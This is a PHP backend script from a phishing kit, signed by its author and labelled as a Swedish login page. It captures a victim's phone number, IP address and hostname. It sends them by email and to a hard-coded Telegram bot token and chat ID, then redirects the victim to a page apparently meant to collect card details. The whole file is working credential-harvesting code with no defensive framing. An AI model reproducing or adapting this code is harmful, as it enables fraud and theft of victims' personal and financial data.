<?php

session_start();

$phone=$_POST["phone"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['phone'] = $phone;

        



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|Login Sweden |----------|\n";
$message .= "Phone  : ".$_SESSION['phone']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$subject = "~ <Rslt- Sweden>- Coded By k4iser.a ~ | $ip";

mail($email, $subject, $message);

$token = "6520712149:AAHeVzmz0NP_Cr4iOQKG6ZcOAg_nAEcuAZM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-4091871371&text=" . urlencode($message)."" );
header("location:load.php?vc?__event=card&service_id=top_card=AU")
?>